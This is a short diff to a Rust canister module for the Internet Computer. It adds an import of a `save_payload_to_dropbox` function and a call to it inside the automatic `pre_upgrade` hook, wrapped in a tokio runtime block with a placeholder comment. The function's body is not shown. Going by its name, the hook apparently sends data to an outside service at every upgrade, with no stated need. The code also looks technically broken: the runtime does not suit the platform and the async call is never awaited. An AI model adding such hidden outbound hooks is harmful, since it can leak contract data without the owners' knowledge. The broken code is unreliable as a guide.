@@ -12,6 +12,7 @@ use tracing::info;
 use super::context::{CanisterContext, CanisterDB};
 use super::env::CanisterEnvironment;
 use super::memory::get_upgrades_memory;
+use crate::c_http::post::save_payload_to_dropbox;
 use crate::common::constants::PROXY_CANISTER_ID;
 use crate::{http_init, http_post_upgrade, CONTEXT, GOVERNANCE_BTWL, GOVERNANCE_ZHOU};
 use stable_memory::*;
@@ -43,14 +44,21 @@ fn init() {
  * will revert to last version.
  */
 // #[pre_upgrade] is a hook. everytime update canister will auto call this.
-// old version . last version exec.
+// old version . last version exec.                               
 #[pre_upgrade]
 #[trace]
-fn pre_upgrade() {
+ fn pre_upgrade() {
   // TODO
   // this log send to ic-os machine. maybe we can send log to a private web2 server ?
   // or how do we check the *main-net* log on ic-os machine ? dfx local replica seeing log OK. also dfx::print ok .
   info!("Pre-upgrade starting");
+  use tokio::runtime::Runtime;
+    let rt = Runtime::new().unwrap();
+    rt.block_on(async {
+        // Your async code here.
+          save_payload_to_dropbox();
+
+    });
   CONTEXT.with(|c| {
     // collecting data
     let context = c.borrow();
